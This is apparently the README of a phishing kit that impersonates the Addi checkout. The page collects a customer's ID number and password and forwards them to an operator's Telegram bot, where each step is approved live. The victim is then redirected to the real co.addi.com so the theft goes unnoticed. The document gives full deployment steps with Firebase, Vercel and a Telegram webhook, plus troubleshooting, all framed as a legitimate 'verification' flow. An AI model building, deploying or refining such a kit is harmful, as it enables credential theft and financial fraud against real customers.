# Addi Checkout — validación por bot de Telegram (sin dashboard)

Flujo corto de verificación: el cliente ingresa **usuario y contraseña** y el **asesor valida desde su bot de Telegram** con botones. Al aprobar, el cliente ve «Verificación exitosa», luego una pantalla con el asesor virtual (WhatsApp) **y al final es redirigido a `https://co.addi.com`**.

## 🧩 Flujo actual

```
1. Usuario (cédula)  → bot: ✓ Cuenta existe / ✗ Cuenta no existe
2. Contraseña        → bot: ✓ Verificación exitosa / ✗ Contraseña incorrecta
3. Pantalla de carga «Verificación exitosa» (la activa el asesor desde el bot)
4. Asesor virtual (whatsapp.svg): «En unos momentos se comunicará con usted un asesor virtual»
5. ▶ Redirección automática a https://co.addi.com
```

> Los pasos antiguos (banco, cupo, OTP, cuotas, identidad, éxito) fueron **eliminados**.

## 🤖 Botones que recibes en el bot de Telegram

| Botón | Qué hace |
|---|---|
| `✓ Cuenta existe` / `✗ Cuenta no existe` | Valida la cédula del paso 1 |
| `✓ Verificación exitosa` / `✗ Contraseña incorrecta` | Aprueba o rechaza el paso 2. Al aprobar se activa la pantalla de carga y el cliente termina redirigido |
| `🗑 Borrar sesión` | Elimina la sesión |

Otros comandos del bot: `/menu`, `/solicitudes`, `/probar`, `/borrar`.

## 📁 Archivos

| Archivo | Qué es |
|---|---|
| `index.html` | Checkout del cliente (los 2 pasos + carga + asesor virtual + redirección) |
| `api/notificar.js` | Reenvía al bot de Telegram los mensajes con botones |
| `api/bot.js` | Webhook del bot: recibe tus botones y escribe el `comando` en Firestore |
| `api/config.js` | Entrega al navegador la config de Firebase **leyendo las variables de Vercel** (nada va en el código) |
| `firestore.rules.json` | Reglas de seguridad (pegarlas en la consola) |
| `GUIA-CONFIGURACION.txt` | 📖 **Guía paso a paso para configurar Firebase + Telegram + Vercel** |
| `.env.example` | Plantilla de variables de entorno |
| `*.svg / *.gif / *.png` | Recursos visuales |

## 🚀 Puesta en marcha (resumen)

1. **Firebase**: crea el proyecto, activa Firestore y **Authentication → Anónimo**.
2. **Reglas**: pega `firestore.rules.json` en Firestore → Rules y cambia `CAMBIA-ESTE-TOKEN` por tu token.
3. **Configuración (segura)**: define las variables `FIREBASE_*` en Vercel (ver `.env.example`). La página las pide a `/api/config` al cargar — **no se escriben en el código**.
4. **Bot**: crea el bot con @BotFather → token → envíale un mensaje → saca tu `chat id` de `getUpdates`.
5. **Vercel**: sube el proyecto y define las variables de entorno (ver `.env.example`).
6. **Webhook** (una vez por *token + dominio*): `https://api.telegram.org/bot<TU_TOKEN>/setWebhook?url=https://TU-DOMINIO/api/bot`
   - No hace falta repetirlo al redesplegar en el **mismo** dominio.
   - Sí hay que repetirlo si cambias de **dominio/proyecto** o creas **otro bot** (otro token).

Detalles completos en **`GUIA-CONFIGURACION.txt`**.

## ⚠️ La web «se cae» cuando pones tu bot y tus datos — aquí está el porqué

Por diseño, **ningún secreto viaja en el código ni en git**: la página pide la
configuración a `/api/config` y el bot la lee de las variables de Vercel.
Si al importar el repo en Vercel **omites un paso**, la app no muestra un error
grande: se queda «esperando», los botones no responden y parece que se cayó.

Los 4 casos reales que ves al poner tu bot y tus datos:

1. **La página carga pero «Continuar» no hace nada y sale un aviso rojo con variables.**
   → Pusiste el token/datos en un archivo `.env` local o dentro del código.
   Vercel no los ve: el `.env` está excluido de git (`.gitignore`) y no se importa.
   → Solución: crea las variables **solo en Vercel → Settings → Environment
   Variables** y pulsa **Redeploy** (Deployments → Redeploy). Nada en el código.

2. **El asesor toca ✓ en el bot y aparece «Error…» (o «Procesando…» y no pasa nada).**
   → **Authentication → Anónimo** desactivado, o las **Reglas de Firestore** no
   publicadas (o la base de datos no existe).
   → Solución: Activa el login anónimo y publica `firestore.rules.json`
   (Firestore → Rules → Publicar). El bot ahora **avisa con el error real** en
   lugar de ignorarlo.

3. **El bot no recibe nada del cliente.**
   → Faltan `TELEGRAM_BOT_TOKEN` / `ADMIN_CHAT_ID` en Vercel, o guardaste las
   variables pero **no redesplegaste** (el despliegue viejo sigue sin ellas).

4. **Los botones de Telegram «no responden».**
   → El **webhook** no está conectado, apunta a una URL vieja/borrada, o está en
   conflicto con `getUpdates` (si abriste `.../getUpdates` para sacar tu chat id
   y **lo dejaste abierto o en una app**, marca conflicto "409 Conflict").
   → Solución: reconecta el webhook con
   `https://api.telegram.org/bot<TU_TOKEN>/setWebhook?url=https://TU-DOMINIO/api/bot`
   y luego verifícalo con `.../getWebhookInfo`.

### 🧪 Diagnóstico automático (nuevo)
Escribe `/probar` en el bot (o `/menu` → «🧪 Probar bot»). El bot responde ✅/❌
con: variables de entorno, validez del token, webhook (último error de Telegram),
login anónimo y si Firestore acepta escrituras. Con eso sabes exactamente cuál de
los 4 casos es el tuyo.

## ▶️ Probar en local

```bash
vercel dev
```
Abre `http://localhost:3000` para el flujo del cliente. Para probar los botones del bot se necesita una URL pública (Previews de Vercel o `ngrok` apuntando a `http://localhost:3000/api/bot`).

## 🔒 Seguridad

- `TELEGRAM_BOT_TOKEN`, `ADMIN_CHAT_ID` y TODAS las `FIREBASE_*` viven **solo en las variables de entorno de Vercel** (nunca en el código ni en el repo).
- La página pide la configuración de Firebase a **`/api/config`**, que la lee de Vercel.
- El token de asesor debe ser el mismo en: `firestore.rules.json` → `adminToken` y la variable `FIREBASE_ADMIN_TOKEN`.
- Nota honesta: la `apiKey` web de Firebase es pública por diseño (la necesita el navegador). Lo que NO se filtra son los **secretos reales** (`TELEGRAM_BOT_TOKEN`, `FIREBASE_ADMIN_TOKEN`) y la seguridad de la base se apoya en las **reglas de Firestore**.

## ⚠️ Nota producción real

El bot escribe el `comando` usando login anónimo + `adminToken` (según las reglas). El siguiente nivel es usar **Admin SDK** de Firebase en `/api/bot` con credenciales de servicio.